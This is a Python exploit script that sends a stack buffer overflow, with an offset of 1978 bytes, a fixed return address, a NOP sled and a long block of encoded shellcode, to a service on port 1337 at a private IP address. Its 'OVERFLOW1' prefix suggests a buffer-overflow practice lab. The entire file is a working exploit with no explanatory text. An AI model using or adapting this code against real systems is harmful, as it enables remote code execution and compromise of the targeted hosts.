#!/usr/bin/env python3
import socket

ip = "10.10.175.52"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xd3\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x9d\xa9\xb5\xda\x83\xee\xfc\xe2\xf4\x61\x41\x37\xda"
"\x9d\xa9\xd5\x53\x78\x98\x75\xbe\x16\xf9\x85\x51\xcf\xa5"
"\x3e\x88\x89\x22\xc7\xf2\x92\x1e\xff\xfc\xac\x56\x19\xe6"
"\xfc\xd5\xb7\xf6\xbd\x68\x7a\xd7\x9c\x6e\x57\x28\xcf\xfe"
"\x3e\x88\x8d\x22\xff\xe6\x16\xe5\xa4\xa2\x7e\xe1\xb4\x0b"
"\xcc\x22\xec\xfa\x9c\x7a\x3e\x93\x85\x4a\x8f\x93\x16\x9d"
"\x3e\xdb\x4b\x98\x4a\x76\x5c\x66\xb8\xdb\x5a\x91\x55\xaf"
"\x6b\xaa\xc8\x22\xa6\xd4\x91\xaf\x79\xf1\x3e\x82\xb9\xa8"
"\x66\xbc\x16\xa5\xfe\x51\xc5\xb5\xb4\x09\x16\xad\x3e\xdb"
"\x4d\x20\xf1\xfe\xb9\xf2\xee\xbb\xc4\xf3\xe4\x25\x7d\xf6"
"\xea\x80\x16\xbb\x5e\x57\xc0\xc1\x86\xe8\x9d\xa9\xdd\xad"
"\xee\x9b\xea\x8e\xf5\xe5\xc2\xfc\x9a\x56\x60\x62\x0d\xa8"
"\xb5\xda\xb4\x6d\xe1\x8a\xf5\x80\x35\xb1\x9d\x56\x60\x8a"
"\xcd\xf9\xe5\x9a\xcd\xe9\xe5\xb2\x77\xa6\x6a\x3a\x62\x7c"
"\x22\xb0\x98\xc1\xbf\xdc\x8a\xa8\xdd\xd8\x9d\xb8\xe9\x53"
"\x7b\xc3\xa5\x8c\xca\xc1\x2c\x7f\xe9\xc8\x4a\x0f\x18\x69"
"\xc1\xd6\x62\xe7\xbd\xaf\x71\xc1\x45\x6f\x3f\xff\x4a\x0f"
"\xf5\xca\xd8\xbe\x9d\x20\x56\x8d\xca\xfe\x84\x2c\xf7\xbb"
"\xec\x8c\x7f\x54\xd3\x1d\xd9\x8d\x89\xdb\x9c\x24\xf1\xfe"
"\x8d\x6f\xb5\x9e\xc9\xf9\xe3\x8c\xcb\xef\xe3\x94\xcb\xff"
"\xe6\x8c\xf5\xd0\x79\xe5\x1b\x56\x60\x53\x7d\xe7\xe3\x9c"
"\x62\x99\xdd\xd2\x1a\xb4\xd5\x25\x48\x12\x45\x6f\x3f\xff"
"\xdd\x7c\x08\x14\x28\x25\x48\x95\xb3\xa6\x97\x29\x4e\x3a"
"\xe8\xac\x0e\x9d\x8e\xdb\xda\xb0\x9d\xfa\x4a\x0f")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
